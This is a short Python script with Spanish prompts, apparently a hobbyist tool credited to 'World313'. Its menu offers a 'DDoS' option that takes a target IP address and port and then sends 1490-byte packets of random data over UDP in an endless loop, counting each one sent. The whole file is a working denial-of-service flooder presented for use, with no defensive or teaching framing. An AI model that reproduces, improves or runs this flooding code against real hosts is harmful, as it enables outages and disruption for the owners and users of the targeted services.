#Code by World313 (CalledLeader551)
from os import system
import socket
import random
import banner

#Colors list
black = '\u001b[30;1m'
red = '\u001b[31;1m'
green = '\u001b[32;1m'
yellow = '\u001b[33;1m'
blue = '\u001b[34;1m'
pink= '\u001b[35;1m'
cian= '\u001b[36;1m'
white= '\u001b[37;1m'
reset = '\u001b[0m'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

system('clear')
banner.banner()
print('\033[0;32m'+'\n\t\t\t   by World313\n\t\t\t[CalledLeader551]\n')
input('\033[0;33m'+'\t\t Presione Enter para continuar...')

while True:

    system('clear')
    print('''
\t\t   ___________________________
\t\t   |                         |
\t\t   |    '''+'''\033[1;37m'''+'''['''+'''\033[0;31m'''+'''1'''+'''\033[1;37m'''+'''] '''+'''\033[1;33m'''+'''DDoS'''+'''\033[0;37m'''+'''             '''+'''\033[0;33m'''+'''|
\t\t   '''+'''\033[0;33m'''+'''|   '''+'''\033[1;37m'''+'''['''+'''\033[0;31m'''+'''x'''+'''\033[1;37m'''+'''] '''+'''\033[1;33m'''+'''Salir'''+'''\033[0;37m'''+'''             '''+'''\033[0;33m'''+'''|
\t\t   '''+'''\033[0;33m'''+'''|                         |
\t\t   |    '''+'''\033[1;31m'''+'''Proximamente'''+'''\033[0;37m'''+'''         '''+'''\033[0;33m'''+'''|
\t\t   |_________________________|
'''+'''\033[0;32m'''+'''
\t\t\t   by World313
\t\t\t[CalledLeader551]
''')

    options = input('Input -> ').lower()

    if options=='1':
        system('clear')
        ip = input('\033[1;33m'+'IP del objetivo: '+'\033[1;32m')
        port = int(input('\033[1;33m'+'Puerto: '+'\033[1;32m'))

        sent = 0

        while True:
            sock.sendto(bytes, (ip,port))
            sent += 1
            print('\033[0;32m'+'Se enviaron '+'\033[0;31m'+f'{sent}'+'\033[0;32m'+' a '+'\033[0;31m'+f'{ip}'+'\033[0;32m'+' por el puerto: '+'\033[0;31m'+f'{port}')
            if port == 65534:
                port = 1
    elif options=='x':
        system('clear')
        print('Programa cerrado')
        break
    else:
        print('\033[0;31m'+f'El caracter "{options}" no existe\n')
        input('\033[1;33m'+'\t\t Presione Enter para continuar...')